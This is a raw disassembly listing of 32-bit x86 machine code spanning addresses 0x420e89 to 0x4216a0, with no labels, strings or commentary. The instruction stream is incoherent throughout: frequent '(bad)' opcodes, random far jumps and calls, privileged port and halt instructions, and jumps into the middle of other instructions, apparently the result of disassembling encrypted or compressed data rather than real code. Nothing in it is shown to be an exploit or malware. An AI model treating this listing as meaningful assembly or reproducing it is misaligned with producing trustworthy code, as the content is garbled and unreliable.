  420e89:	or     eax,0x18b00
  420e8e:	inc    BYTE PTR [ecx]
  420e90:	add    BYTE PTR [eax],al
  420e92:	popa   
  420e93:	idiv   DWORD PTR [edi]
  420e95:	xor    DWORD PTR [ecx+0x405dcc1d],ebp
  420e9b:	adc    DWORD PTR [edx-0x7641b310],esp
  420ea1:	add    eax,0x95c64364
  420ea6:	pop    esi
  420ea7:	rcr    DWORD PTR ds:0x70c942ed,1
  420ead:	mov    edx,edx
  420eaf:	fsubr  DWORD PTR [edx-0x56]
  420eb2:	js     0x420e9a
  420eb4:	lods   eax,DWORD PTR ds:[esi]
  420eb5:	out    dx,eax
  420eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb7:	(bad)  
  420eb8:	cld    
  420eb9:	mov    eax,ds:0x38c1a6e6
  420ebe:	rcl    DWORD PTR [ebx+esi*4],cl
  420ec1:	push   ecx
  420ec2:	test   DWORD PTR [edx+edi*1+0x67],eax
  420ec6:	sub    eax,0x47a257ae
  420ecb:	jo     0x420f16
  420ecd:	mov    ecx,0x8419d808
  420ed2:	rcl    BYTE PTR [ecx-0x12],0xa4
  420ed6:	or     ah,BYTE PTR [eax+0x7b038d0d]
  420edc:	pop    edi
  420edd:	aam    0x22
  420edf:	mov    ds:0x289cad9,eax
  420ee4:	out    0xd2,eax
  420ee6:	xor    eax,0x76cb35ae
  420eeb:	pop    esi
  420eec:	sbb    bl,BYTE PTR [ebp-0x6065e3bf]
  420ef2:	mov    ebp,0xf84ac5d0
  420ef7:	pop    ecx
  420ef8:	es xor eax,0x4fbe68e4
  420efe:	jne    0x420ebc
  420f00:	lods   eax,DWORD PTR ds:[esi]
  420f01:	jo     0x420efa
  420f03:	loop   0x420ed2
  420f05:	mov    esi,0xc5efda91
  420f0a:	sbb    eax,0x8228ebbe
  420f0f:	popa   
  420f10:	mov    ds:0xd3f2ea70,eax
  420f15:	cmp    eax,0xd2247f6
  420f1a:	ss (bad) 
  420f1c:	div    DWORD PTR [ecx]
  420f1e:	retf   
  420f1f:	mov    al,0x9b
  420f21:	push   0x5d8a4ef8
  420f26:	adc    BYTE PTR [edi],bl
  420f28:	jge    0x420f88
  420f2a:	call   DWORD PTR [esi]
  420f2c:	bound  esi,QWORD PTR [ebx]
  420f2e:	push   ecx
  420f2f:	test   BYTE PTR ds:0xbc5052fb,al
  420f35:	mov    ah,0x5b
  420f37:	into   
  420f38:	cdq    
  420f39:	dec    edi
  420f3a:	dec    esi
  420f3b:	cwde   
  420f3c:	jl     0x420ee2
  420f3e:	push   ebx
  420f3f:	sbb    ch,BYTE PTR [edx]
  420f41:	aad    0x28
  420f43:	jb     0x420f1c
  420f45:	mov    esp,0xad9fb568
  420f4a:	jno    0x420ed2
  420f4c:	fwait
  420f4d:	cmp    DWORD PTR [ebx-0x18b270b5],edi
  420f53:	pop    es
  420f54:	pop    ebx
  420f55:	in     eax,0x1a
  420f57:	call   0xcc57e009
  420f5c:	mov    ebp,edx
  420f5e:	dec    edi
  420f5f:	mov    BYTE PTR [eax+0x52],ah
  420f62:	fbstp  TBYTE PTR [ecx+0x6500d2fe]
  420f68:	xor    dh,BYTE PTR [edx-0x2c]
  420f6b:	loopne 0x420f54
  420f6d:	sub    eax,0xb051271c
  420f72:	xor    cl,BYTE PTR [edx]
  420f74:	push   edx
  420f75:	or     ecx,0xb4744f6e
  420f7b:	push   0xdffff0fc
  420f80:	inc    edx
  420f81:	jbe    0x420f34
  420f83:	xor    BYTE PTR [eax],ah
  420f85:	push   edi
  420f86:	int    0xa7
  420f88:	adc    al,0x82
  420f8a:	cmp    eax,0x7ed592f1
  420f8f:	mov    bh,0xb3
  420f91:	mov    cl,0x70
  420f93:	sub    BYTE PTR [ebx+0x4a36e9a1],dl
  420f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f9a:	and    bl,ch
  420f9c:	inc    esp
  420f9d:	addr16 cmp eax,0x1a122476
  420fa3:	mov    edx,0x6578a9c8
  420fa8:	repz mov ah,0x4d
  420fab:	aas    
  420fac:	mul    BYTE PTR [edx+0x41]
  420faf:	rcl    BYTE PTR ds:0x7082055a,1
  420fb5:	mov    bh,0x75
  420fb7:	push   es
  420fb8:	daa    
  420fb9:	call   0x588bbcf8
  420fbe:	lods   al,BYTE PTR ds:[esi]
  420fbf:	mov    WORD PTR [eax],?
  420fc1:	and    edx,DWORD PTR [eax+0x19]
  420fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fc5:	fimul  WORD PTR [ebx]
  420fc7:	add    edi,esi
  420fc9:	mov    edi,0x9500ab3
  420fce:	sbb    edx,esp
  420fd0:	or     al,0x26
  420fd2:	adc    esi,DWORD PTR [edx]
  420fd4:	jo     0x420fe4
  420fd6:	or     DWORD PTR [ecx],esp
  420fd8:	jb     0x420f9f
  420fda:	xor    eax,0x87e6c731
  420fdf:	frstor [ebx]
  420fe1:	xlat   BYTE PTR ds:[ebx]
  420fe2:	jmp    0xd3b4:0xbf690995
  420fe9:	dec    BYTE PTR [ebp-0x463fb5bf]
  420fef:	cli    
  420ff0:	(bad)  
  420ff1:	bound  edi,QWORD PTR [ecx-0x52]
  420ff4:	lock call 0x803:0x3dc4dfe3
  420ffc:	adc    DWORD PTR [edi],ecx
  420ffe:	bound  esi,QWORD PTR [ecx-0x43]
  421001:	cmp    DWORD PTR [ebx],0x5bd54502
  421007:	mov    bh,BYTE PTR [eax+0x43]
  42100a:	ret    0xeeda
  42100d:	mov    ebp,0xc0348c69
  421012:	jns    0x420ff2
  421014:	retf   
  421015:	rcr    DWORD PTR [edi-0x9c190cc],cl
  42101b:	mov    dh,dl
  42101d:	jbe    0x42101c
  42101f:	hlt    
  421020:	jbe    0x42106f
  421022:	mov    ebp,0xc301ed98
  421027:	pop    es
  421028:	jmp    edi
  42102a:	bound  eax,QWORD PTR [edi-0x5f8a2060]
  421030:	mov    ah,0x96
  421032:	mov    cl,0x4c
  421034:	in     al,0x62
  421036:	adc    bl,BYTE PTR gs:0x8f08d3b3
  42103d:	shr    esi,0x81
  421040:	xor    cl,ah
  421042:	xor    eax,0x8862f95f
  421047:	inc    ecx
  421048:	jl     0x420ff4
  42104a:	inc    ecx
  42104b:	jl     0x421040
  42104d:	js     0x420fe9
  42104f:	int3   
  421050:	xor    BYTE PTR [ebp-0x3c8846d9],ah
  421056:	imul   esi,eax,0xffffff83
  421059:	addr16 int3 
  42105b:	xchg   BYTE PTR [ecx-0x9],ah
  42105e:	mov    ebx,0xc1a57d4e
  421063:	mov    eax,ds:0x5b69c353
  421068:	mov    dh,0x7b
  42106a:	pop    edx
  42106b:	lock jno 0x421031
  42106e:	aad    0x12
  421070:	or     BYTE PTR [edi-0x162ab4a8],ah
  421076:	call   0x5668:0x300d81ea
  42107d:	popf   
  42107e:	pop    ecx
  42107f:	sub    al,0x30
  421081:	xchg   esi,eax
  421082:	dec    esp
  421083:	sub    eax,0xf5620ee3
  421088:	leave  
  421089:	(bad)  
  42108a:	js     0x42103b
  42108c:	xor    BYTE PTR [ecx],dh
  42108e:	ret    
  42108f:	push   ds
	...
  421098:	add    BYTE PTR [eax],al
  42109a:	pop    esp
  42109b:	mov    dh,BYTE PTR [edi-0x23800895]
  4210a1:	mov    edi,0x2b60ebfc
  4210a6:	clc    
  4210a7:	sahf   
  4210a8:	xor    esp,edi
  4210aa:	dec    BYTE PTR [ecx+eax*1+0x1fe00]
  4210b1:	add    BYTE PTR [esp+ebp*2+0x6e],dl
  4210b5:	ins    BYTE PTR es:[edi],dx
  4210b6:	mov    ebx,0x8059f962
  4210bb:	mov    esi,0x26a66a9d
  4210c0:	adc    dh,dh
  4210c2:	lds    edi,FWORD PTR [edx+eiz*2-0x77c89b27]
  4210c9:	(bad)  
  4210ca:	mov    edx,0x87708ce0
  4210cf:	add    eax,0x36c6bdd1
  4210d4:	xor    BYTE PTR ds:0x3788eb92,bl
  4210da:	cld    
  4210db:	cmc    
  4210dc:	in     al,0xe4
  4210de:	adc    bl,dl
  4210e0:	repz sbb ebp,DWORD PTR [bp-0x25ca]
  4210e6:	xchg   ecx,eax
  4210e7:	xchg   BYTE PTR [ecx],al
  4210e9:	adc    DWORD PTR ss:[esi+eiz*4],ebp
  4210ed:	aam    0xf5
  4210ef:	(bad)  
  4210f0:	dec    BYTE PTR ds:0xd233c7dc
  4210f6:	adc    eax,0xfdd7be04
  4210fb:	adc    DWORD PTR ds:0xba58654b,ebp
  421101:	sbb    edi,esi
  421103:	in     eax,dx
  421104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421105:	test   cl,bh
  421107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421108:	mov    al,ds:0xa903b084
  42110d:	and    DWORD PTR [esi+0x36],edi
  421110:	sub    eax,0xe466769c
  421115:	aam    0x90
  421117:	dec    edi
  421118:	ins    DWORD PTR es:[edi],dx
  421119:	or     BYTE PTR [esi+0x32766694],al
  42111f:	leave  
  421120:	sub    eax,0x3bea90a9
  421125:	rol    ebp,cl
  421127:	rol    ch,0x9c
  42112a:	sbb    dh,bl
  42112c:	dec    esi
  42112d:	xchg   esp,eax
  42112e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42112f:	loop   0x421171
  421131:	jne    0x4210e1
  421133:	adc    eax,0xd23980c9
  421138:	aad    0x38
  42113a:	frstor [ebp+0x2858476b]
  421140:	repz mov eax,ds:0x69f143f8
  421146:	loopne 0x42113a
  421148:	inc    ecx
  421149:	fnsave [ebx]
  42114b:	jl     0x42115e
  42114d:	loop   0x4211cd
  42114f:	cdq    
  421150:	bound  esp,QWORD PTR [edi]
  421152:	fs cld 
  421154:	lea    esp,[eax]
  421156:	push   esp
  421157:	nop
  421158:	bound  ebp,QWORD PTR [esi+ecx*1]
  42115b:	mov    ecx,0xb093af5
  421160:	pop    edx
  421161:	retf   
  421162:	shl    BYTE PTR [eax],1
  421164:	inc    edx
  421165:	outs   dx,DWORD PTR ds:[esi]
  421166:	inc    ebp
  421167:	sbb    ch,BYTE PTR [ebx]
  421169:	fldl2t 
  42116b:	popa   
  42116c:	pusha  
  42116d:	push   cs
  42116e:	push   cs
  42116f:	sahf   
  421170:	inc    esp
  421171:	loope  0x4211a4
  421173:	retf   
  421174:	sbb    esp,DWORD PTR [edx+0x593ba524]
  42117a:	addr16 jl 0x421163
  42117d:	xor    ecx,DWORD PTR [esi]
  42117f:	(bad)
  421183:	bound  esi,QWORD PTR [edx-0x5ba4c426]
  421189:	sahf   
  42118a:	pop    ebx
  42118b:	(bad)  
  42118c:	(bad)  
  42118d:	sbb    eax,0xbf9cd5da
  421192:	sbb    eax,0x1d0888f6
  421197:	daa    
  421198:	sbb    DWORD PTR [ebp+0x3fffa55],edx
  42119e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211a0:	cwde   
  4211a1:	popf   
  4211a2:	mov    edx,0x6123a60d
  4211a7:	push   ds
  4211a8:	sbb    eax,DWORD PTR [edi]
  4211aa:	and    eax,eax
  4211ac:	jmp    0xe6f7758f
  4211b1:	dec    edx
  4211b2:	xor    al,0x63
  4211b4:	mov    esp,0x337c7c70
  4211b9:	aas    
  4211ba:	cmp    BYTE PTR [esi],al
  4211bc:	dec    edx
  4211bd:	es mov cl,0xe1
  4211c0:	xor    cl,BYTE PTR [eax+0x34c6222e]
  4211c6:	pop    ecx
  4211c7:	jl     0x42120a
  4211c9:	mov    esp,0x5c245300
  4211ce:	xchg   DWORD PTR [ebx],ebp
  4211d0:	fldcw  WORD PTR [edx-0x41]
  4211d3:	push   ecx
  4211d4:	fmulp  st(1),st
  4211d6:	jmp    0x4211d4
  4211d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211d9:	cmp    BYTE PTR [ebx-0x3b],bh
  4211dc:	and    edi,ebx
  4211de:	(bad)  
  4211df:	out    0x10,al
  4211e1:	sbb    eax,0xca95d29a
  4211e6:	leave  
  4211e7:	rcr    BYTE PTR [eax],cl
  4211e9:	cmovs  ecx,DWORD PTR [ecx-0x71]
  4211ed:	jo     0x4211e5
  4211ef:	pop    edi
  4211f0:	push   gs
  4211f2:	sub    eax,0xb08719b7
  4211f7:	popa   
  4211f8:	sub    BYTE PTR [eax+ebx*2-0x3e2a1868],0x49
  421200:	mov    al,ds:0x224c65fb
  421205:	sbb    edi,DWORD PTR [eax+0x60]
  421208:	sar    BYTE PTR [esi],0xc6
  42120b:	fwait
  42120c:	inc    eax
  42120d:	jae    0x4211d4
  42120f:	aad    0x84
  421211:	push   cs
  421212:	mul    BYTE PTR [ebp+0x4d]
  421215:	fild   QWORD PTR [edx]
  421217:	cs or  eax,0xba40f2c0
  42121d:	jno    0x4211da
  42121f:	jns    0x42121d
  421221:	add    DWORD PTR [eiz*2+0x44f756d],edx
  421228:	repz mov bl,0xf8
  42122b:	imul   esi,ecx,0x54
  42122e:	aaa    
  42122f:	outs   dx,BYTE PTR ds:[esi]
  421230:	call   0xcca38b18
  421235:	call   0x638635dd
  42123a:	inc    ebp
  42123b:	adc    eax,0x4ac7cb13
  421240:	mov    DWORD PTR [ebx-0x57],ecx
  421243:	inc    ebx
  421244:	ins    BYTE PTR es:[edi],dx
  421245:	ret    0x7209
  421248:	bound  edx,QWORD PTR [ecx+0x3a]
  42124b:	(bad)  
  42124c:	adc    al,0x7f
  42124e:	repz sahf 
  421250:	jne    0x4211f5
  421252:	cmp    ebp,edi
  421254:	enter  0xe5f5,0xf4
  421258:	shl    BYTE PTR [eax-0x49],cl
  42125b:	stos   DWORD PTR es:[edi],eax
  42125c:	fmul   QWORD PTR [ebp-0x247b5234]
  421262:	mov    eax,DWORD PTR [esi]
  421264:	cdq    
  421265:	or     eax,0xe59676c6
  42126a:	add    bh,BYTE PTR [esi+esi*4+0x7a]
  42126e:	test   al,0x39
  421270:	dec    esp
  421271:	fisttp QWORD PTR [ecx+0x4e61a29]
  421277:	fiadd  WORD PTR [edi-0x60]
  42127a:	stc    
  42127b:	sbb    BYTE PTR [edx],bh
  42127d:	mov    fs,WORD PTR [ecx-0x30]
  421280:	retf   0x100a
  421283:	jne    0x4212fc
  421285:	inc    edi
  421286:	in     al,dx
  421287:	stos   DWORD PTR es:[edi],eax
  421288:	pop    eax
  421289:	adc    ebx,DWORD PTR [edi+0x70]
  42128c:	retf   
  42128d:	jb     0x421257
  42128f:	cmp    al,0x78
  421291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421292:	stos   BYTE PTR es:[edi],al
  421293:	mov    al,ds:0x692d888b
  421298:	fild   WORD PTR [edx-0x758579cd]
  42129e:	repnz push ebx
  4212a0:	push   edi
  4212a1:	jns    0x4212ff
  4212a3:	sbb    ch,BYTE PTR [edi-0x40]
  4212a6:	in     al,dx
  4212a7:	cmp    al,0xe9
  4212a9:	adc    eax,0xfe8eb22e
  4212ae:	(bad)  
  4212af:	popf   
	...
  4212b8:	add    BYTE PTR [eax],al
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	sbb    al,BYTE PTR [edi-0x204026]
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx-0x5ffef6ee]
  4212ca:	cld    
  4212cb:	mov    es,WORD PTR [ecx]
  4212cd:	add    dh,bh
  4212cf:	add    DWORD PTR [eax],eax
  4212d1:	add    dl,ah
  4212d3:	pop    eax
  4212d4:	mov    BYTE PTR [ebx],al
  4212d6:	(bad)  
  4212d7:	jmp    0x42133e
  4212d9:	(bad)  
  4212da:	fucomip st,st(6)
  4212dc:	jns    0x42126c
  4212de:	jle    0x421271
  4212e0:	mov    cl,0x1d
  4212e2:	pop    edx
  4212e3:	mov    bh,0x26
  4212e5:	test   eax,0x8c62e752
  4212ea:	in     al,dx
  4212eb:	enter  0xeb70,0x87
  4212ef:	(bad)  
  4212f0:	push   esi
  4212f1:	pop    ebx
  4212f2:	dec    edx
  4212f3:	inc    ecx
  4212f4:	pop    es
  4212f5:	(bad)  
  4212f6:	push   eax
  4212f7:	sub    dh,0xe
  4212fa:	and    al,0xc
  4212fc:	(bad)  
  4212fd:	(bad)  
  4212fe:	fnstenv [ebx-0x2c]
  421301:	inc    edx
  421302:	push   ebp
  421303:	mov    al,ds:0xdcea89bf
  421308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421309:	pop    edi
  42130a:	sub    edi,edi
  42130c:	mov    ch,0x7c
  42130e:	repz or al,0xd0
  421311:	xchg   bx,ax
  421313:	push   cs
  421314:	stos   BYTE PTR es:[edi],al
  421315:	sar    ecx,1
  421317:	push   ecx
  421318:	sub    al,0x92
  42131a:	mov    ch,0x7d
  42131c:	jae    0x421345
  42131e:	pop    ebx
  42131f:	xchg   ebx,eax
  421320:	jb     0x4212d6
  421322:	jmp    0x1775:0x1dcd8c47
  421329:	pop    edi
  42132a:	std    
  42132b:	loop   0x421354
  42132d:	fidivr DWORD PTR [esp+edx*2-0x4bc4f489]
  421334:	popa   
  421335:	mov    edx,0xc514a7fd
  42133a:	bound  edi,QWORD PTR [edi]
  42133c:	neg    DWORD PTR [ebx+0x559c9bd0]
  421342:	xchg   DWORD PTR [edi+0x7d251531],ecx
  421348:	in     al,dx
  421349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42134a:	iret   
  42134b:	je     0x42136e
  42134d:	mov    eax,DWORD PTR [ebp-0x665f12f8]
  421353:	ret    
  421354:	and    eax,0xdf5e1a38
  421359:	sbb    DWORD PTR [ebx+0x2c377d93],edi
  42135f:	cmp    eax,0x1f22f698
  421364:	inc    eax
  421365:	lock add eax,0x1f0d7f20
  42136b:	repnz lahf 
  42136d:	xchg   edx,eax
  42136e:	pop    ds
  42136f:	push   edx
  421370:	icebp  
  421371:	addr16 sbb eax,0x55005a39
  421377:	popa   
  421378:	fucom  st(1)
  42137a:	fs dec ecx
  42137c:	xor    al,0x3b
  42137e:	dec    ebx
  42137f:	add    DWORD PTR [edi],ebx
  421381:	popf   
  421382:	xchg   ebp,eax
  421383:	ins    DWORD PTR es:[edi],dx
  421384:	call   0x7b04:0x1762bc3c
  42138b:	(bad)
  42138e:	and    ebx,esi
  421390:	jne    0x4213a1
  421392:	(bad)  ds:0xbe0f8018
  421398:	repnz ficom DWORD PTR [edi+eiz*1+0x1ab3aa02]
  4213a0:	daa    
  4213a1:	jae    0x421339
  4213a3:	(bad)  
  4213a4:	neg    DWORD PTR [eax-0x7140abfe]
  4213aa:	cs icebp 
  4213ac:	loope  0x4213cb
  4213ae:	push   ebp
  4213af:	jp     0x42140c
  4213b1:	iret   
  4213b2:	adc    eax,0x7470d860
  4213b7:	mov    ah,0x96
  4213b9:	(bad)  
  4213ba:	or     ebp,DWORD PTR [eax+0x3168f134]
  4213c0:	aam    0xdc
  4213c2:	mov    ebp,0x9c0e388
  4213c7:	fldln2 
  4213c9:	sti    
  4213ca:	pop    esp
  4213cb:	pop    es
  4213cc:	add    DWORD PTR [ebp-0x79cf642a],edi
  4213d2:	cmp    al,BYTE PTR [edi]
  4213d4:	test   eax,0x7fab5cc5
  4213d9:	repz in eax,0xae
  4213dc:	loopne 0x421375
  4213de:	lea    ecx,[ebx-0x7a2f2699]
  4213e4:	cmp    al,0x96
  4213e7:	(bad)  [edx]
  4213e9:	push   0xffffffa1
  4213eb:	jle    0x42146a
  4213ed:	arpl   WORD PTR [eax+0x1ff0df74],dx
  4213f3:	jnp    0x42138e
  4213f5:	cmp    ah,BYTE PTR [eax+0x2821763d]
  4213fb:	jp     0x42143e
  4213fd:	push   0xffffffac
  4213ff:	inc    edx
  421400:	bound  ecx,QWORD PTR [esi]
  421402:	frstor [edx+0x28]
  421405:	push   ebp
  421406:	mov    WORD PTR [edi+0x2f],?
  421409:	in     al,0x22
  42140b:	fadd   QWORD PTR [edi+ebx*4]
  42140e:	int    0x5d
  421410:	dec    esi
  421411:	cmc    
  421412:	or     eax,0xaded82d0
  421417:	xor    esp,DWORD PTR [esi]
  421419:	sub    edi,DWORD PTR [eax-0x76]
  42141c:	(bad)  
  42141d:	jns    0x421432
  42141f:	in     al,0x4c
  421421:	and    DWORD PTR [edx-0x2],ebp
  421424:	loopne 0x42149e
  421426:	jmp    0x7a0192c9
  42142b:	outs   dx,DWORD PTR ds:[esi]
  42142c:	push   ebp
  42142d:	mov    dl,0x9b
  42142f:	hlt    
  421430:	dec    esp
  421431:	add    DWORD PTR [eax+eax*8],ecx
  421434:	mov    bh,0x6
  421436:	popa   
  421437:	adc    al,0x19
  421439:	loope  0x421463
  42143b:	fiadd  WORD PTR [eax+esi*8-0x657357f6]
  421442:	stos   DWORD PTR es:[edi],eax
  421443:	xor    eax,0x78
  421446:	cdq    
  421447:	push   esp
  421448:	xorps  xmm3,xmm4
  42144b:	add    BYTE PTR [ecx-0x61b4cc06],bh
  421451:	aad    0x4b
  421453:	pop    esi
  421454:	cld    
  421455:	or     eax,0xb3c1c16e
  42145a:	div    DWORD PTR [ebx+ecx*2-0x51b1c680]
  421461:	pop    ebp
  421462:	retf   0xa40e
  421465:	xlat   BYTE PTR ds:[ebx]
  421466:	stos   DWORD PTR es:[edi],eax
  421467:	mov    dh,0x55
  421469:	mov    al,0x73
  42146b:	pop    ebp
  42146c:	lods   eax,DWORD PTR ds:[esi]
  42146d:	popf   
  42146e:	dec    esp
  42146f:	lahf   
  421470:	loope  0x4214c7
  421472:	pop    edi
  421473:	adc    dh,BYTE PTR [esi]
  421475:	cdq    
  421476:	aas    
  421477:	or     dl,BYTE PTR [edx]
  421479:	add    eax,0x89cdb081
  42147e:	sub    DWORD PTR [esp+ebp*1+0x3d],0xca5a6662
  421486:	pop    esp
  421487:	dec    ebp
  421488:	test   BYTE PTR [ebx-0xe],cl
  42148b:	jb     0x421505
  42148d:	jmp    0xe285:0xee150a73
  421494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421495:	and    dh,0x65
  421498:	add    al,ch
  42149a:	js     0x421510
  42149c:	xchg   DWORD PTR [eax+0x54],esp
  42149f:	mov    esi,0x9bbda57
  4214a4:	xchg   ecx,eax
  4214a5:	add    ecx,eax
  4214a7:	sub    eax,0x3f346687
  4214ac:	aam    0xef
  4214ae:	inc    eax
  4214af:	push   esi
  4214b0:	das    
  4214b1:	push   es
  4214b2:	mov    DWORD PTR [eax+0xa474a9b],ebp
  4214b8:	add    edx,DWORD PTR [edi-0x59d161a0]
  4214be:	adc    ah,BYTE PTR [ebx+0x3d]
  4214c1:	es xchg ebp,eax
  4214c3:	rcl    BYTE PTR [edi-0x1406b197],cl
  4214c9:	pop    edi
  4214ca:	test   DWORD PTR [edi],edi
  4214cc:	or     cl,dl
  4214ce:	xchg   ecx,eax
  4214cf:	mov    eax,0x0
  4214d4:	add    BYTE PTR [eax],al
  4214d6:	add    BYTE PTR [eax],al
  4214d8:	add    BYTE PTR [eax],al
  4214da:	popf   
  4214db:	paddd  mm4,QWORD PTR [esi+edi*8-0x5bc0200b]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	(bad)  
  4214e7:	mov    ebx,0x90fa0968
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	inc    BYTE PTR [ecx]
  4214f0:	add    BYTE PTR [eax],al
  4214f2:	and    DWORD PTR [edx],ebx
  4214f4:	popf   
  4214f5:	mov    dl,0xd
  4214f7:	sbb    cl,BYTE PTR [edi+0x17]
  4214fa:	repnz test eax,0xc2ba5d6
  421500:	loop   0x4214a4
  421502:	push   0x5c
  421504:	sub    BYTE PTR [esi-0x7c],ah
  421507:	or     eax,0x15f789c2
  42150c:	xchg   ebp,eax
  42150d:	inc    ebp
  42150e:	ins    DWORD PTR es:[edi],dx
  42150f:	inc    edi
  421510:	jge    0x421519
  421512:	rcl    BYTE PTR [ebp-0x4adb7a03],cl
  421518:	iret   
  421519:	sbb    dh,BYTE PTR [ebx+edi*1]
  42151c:	mov    eax,0x8ea48c78
  421521:	or     BYTE PTR [edx+ebx*2-0x1b],0xdb
  421526:	or     eax,0x81d35012
  42152b:	sub    eax,0x69ce5e0a
  421530:	fdivr  QWORD PTR [edx]
  421532:	pusha  
  421533:	push   ss
  421534:	sub    cl,BYTE PTR [ecx]
  421536:	and    eax,0x1a1a7af9
  42153b:	mov    bl,0xd7
  42153d:	cmp    eax,0x850bc636
  421542:	or     DWORD PTR [esp+edx*2],edi
  421545:	mov    al,ds:0x51389570
  42154a:	clc    
  42154b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42154c:	cmp    ebp,DWORD PTR [ebx+0x5540f3b0]
  421552:	dec    esp
  421553:	fs xchg edx,eax
  421555:	fs and al,0x2b
  421558:	mov    ecx,0x6c4c9f0d
  42155d:	stos   DWORD PTR es:[edi],eax
  42155e:	outs   dx,DWORD PTR ds:[esi]
  42155f:	scas   al,BYTE PTR es:[edi]
  421560:	mov    ecx,0xe1cf3924
  421565:	nop
  421566:	mov    ah,0xa7
  421568:	xchg   edx,eax
  421569:	stc    
  42156a:	loop   0x42153d
  42156c:	popf   
  42156d:	out    dx,eax
  42156e:	push   ebp
  42156f:	mov    ecx,0x3f96f763
  421574:	idiv   DWORD PTR [eax]
  421576:	ja     0x4215af
  421578:	cwde   
  421579:	test   BYTE PTR [eax-0x30],ch
  42157c:	icebp  
  42157d:	or     ecx,DWORD PTR [edi-0x39a338d5]
  421583:	js     0x4215f9
  421585:	loopne 0x421571
  421587:	xor    al,0x96
  421589:	inc    ebp
  42158a:	pop    ebp
  42158b:	xchg   edi,eax
  42158c:	mov    ecx,0xfb279e79
  421591:	lods   eax,DWORD PTR ds:[esi]
  421592:	sub    DWORD PTR [ebx],eax
  421594:	and    BYTE PTR [edx],dh
  421596:	jno    0x4215e0
  421598:	or     eax,0xa3da180c
  42159d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42159e:	xchg   edx,eax
  42159f:	shr    BYTE PTR [esi+eax*4+0x71],1
  4215a3:	xor    BYTE PTR [ebp-0x2abb1e60],ah
  4215a9:	stos   BYTE PTR es:[edi],al
  4215aa:	push   0xfffffffa
  4215ac:	pop    ss
  4215ad:	cmp    eax,0xeac7edc9
  4215b2:	enter  0xa2a2,0xc3
  4215b6:	jno    0x421575
  4215b8:	jg     0x42155d
  4215ba:	jo     0x421607
  4215bc:	and    al,0xf6
  4215be:	data16 mov dl,0x4f
  4215c1:	add    eax,0x4592cff5
  4215c6:	out    dx,al
  4215c7:	mov    cl,0x54
  4215c9:	into   
  4215ca:	iret   
  4215cb:	adc    al,0x4a
  4215cd:	cmp    eax,0x5b675942
  4215d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215d3:	dec    ebp
  4215d4:	push   ss
  4215d5:	mov    ds,WORD PTR [esi]
  4215d7:	test   DWORD PTR [esi-0x7b],eax
  4215da:	pop    es
  4215db:	push   0x34
  4215dd:	adc    BYTE PTR [ecx],bh
  4215df:	das    
  4215e0:	add    DWORD PTR [ebx],edi
  4215e2:	fwait
  4215e3:	sbb    eax,DWORD PTR [eax]
  4215e5:	les    ecx,FWORD PTR [edi-0x25]
  4215e8:	pushf  
  4215e9:	xchg   ecx,eax
  4215ea:	mov    eax,0x126df65a
  4215ef:	mov    edx,0x872930ff
  4215f4:	jmp    0x4215c1
  4215f6:	arpl   bx,sp
  4215f8:	xor    DWORD PTR [ebx],ebx
  4215fa:	aad    0x9d
  4215fc:	ins    DWORD PTR es:[edi],dx
  4215fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215fe:	jae    0x42166d
  421600:	aam    0xeb
  421602:	(bad)  
  421603:	imul   eax,DWORD PTR [edi-0x22ae7208],0x750eaae3
  42160d:	jbe    0x42164c
  42160f:	pop    es
  421610:	sbb    eax,0x4d559843
  421615:	ret    0x5793
  421618:	inc    ebx
  421619:	and    al,ch
  42161b:	js     0x421611
  42161d:	and    DWORD PTR [ebx],ebx
  42161f:	cli    
  421620:	in     al,dx
  421621:	mov    ecx,0xc8a88a5d
  421626:	pop    ecx
  421627:	les    ebp,FWORD PTR [edx-0x24]
  42162a:	and    al,0x29
  42162c:	out    0xc3,eax
  42162e:	jne    0x421673
  421630:	icebp  
  421631:	push   ss
  421632:	sub    DWORD PTR cs:[edi+ebx*2+0x870aa0a],edi
  42163a:	retf   
  42163b:	iret   
  42163c:	pop    esi
  42163d:	ss daa 
  42163f:	pop    ebx
  421640:	pop    esi
  421641:	fistp  DWORD PTR [edi-0x3ae606d2]
  421647:	cwde   
  421648:	pusha  
  421649:	shr    al,0xfb
  42164c:	cmp    bl,BYTE PTR [eax]
  42164e:	lea    ecx,[edi]
  421650:	repnz aaa 
  421652:	(bad)  
  421653:	xchg   edi,eax
  421654:	bound  ecx,QWORD PTR [edi+ebx*2+0x512b2e5]
  42165b:	add    al,0x53
  42165d:	sbb    al,0x83
  42165f:	cdq    
  421660:	fst    DWORD PTR [ebx+0x1335e6d]
  421666:	mov    al,0xe3
  421668:	or     eax,0x3ab1133f
  42166d:	adc    esi,DWORD PTR [esi+0x75c1b1bd]
  421673:	les    ecx,FWORD PTR [esi-0x1f]
  421676:	(bad)  
  421678:	dec    eax
  421679:	xor    ebx,ecx
  42167b:	mov    edi,0xc99e23e8
  421680:	adc    DWORD PTR [edi+ecx*8],esp
  421683:	jo     0x42161d
  421685:	mov    eax,ds:0x5af2910c
  42168a:	pop    es
  42168b:	adc    ah,bl
  42168d:	pop    ebx
  42168e:	icebp  
  42168f:	cmc    
  421690:	mov    ch,0x98
  421692:	in     al,0xfb
  421694:	lea    ebx,[esi+edi*1-0x2163d21a]
  42169b:	test   eax,0x1b7df9b8
  4216a0:	hlt    
